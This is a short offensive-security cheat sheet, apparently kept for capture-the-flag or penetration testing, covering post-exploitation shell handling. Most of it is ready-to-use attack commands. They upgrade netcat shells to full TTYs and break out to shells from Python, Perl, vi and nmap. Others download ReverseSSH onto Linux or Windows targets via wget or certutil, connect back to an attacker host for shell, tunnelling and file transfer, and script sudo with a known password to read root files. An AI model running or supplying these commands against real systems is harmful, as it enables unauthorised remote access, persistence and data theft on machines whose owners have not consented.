# Shells & Shit
```bash
#TTY 

#: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

- (inside the nc session) 
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;


	script -qc /bin/bash /dev/null
	CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;


# SPAWN SHELLS
	-   python -c 'import pty; pty.spawn("/bin/sh")'
	-   echo os.system('/bin/bash')
	-   /bin/sh -i
	-   script -qc /bin/bash /dev/null
	-   perl -e 'exec "/bin/sh";'

	# inside interactives 
		-   perl: exec "/bin/sh";
		-   ruby: exec "/bin/sh"
		-   lua: os.execute('/bin/sh')
		-   IRB: exec "/bin/sh"
		-   vi: :!bash
		-   vi: :set shell=/bin/bash:shell
		-   nmap: !sh
```

### ReverseSSH
```
A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
```
```bash
- wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

- /dev/shm/reverse-ssh -v -l -p 4444
```

```bash
#linux target

- /dev/shm/reverse-ssh -p 4444 user@10.0.0.2
```

```bash
# windows target

- certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

- reverse-ssh.exe -p 4444 kali@10.0.0.2

# If the ReverseSSH port forwarding request was successful, you should now be able to log in with default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`

# Interactive shell access
- ssh -p 8888 127.0.0.1

# Bidirectional file transfer
- sftp -P 8888 127.0.0.1

```

### What to do when you cannot get TTY (No TTY)
```bash
#you still can interact with programs that expects user input. In the following example, the password is passed to sudo to read a file:

- expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```

```
(linux shells)
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux

(windows shells)
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows
```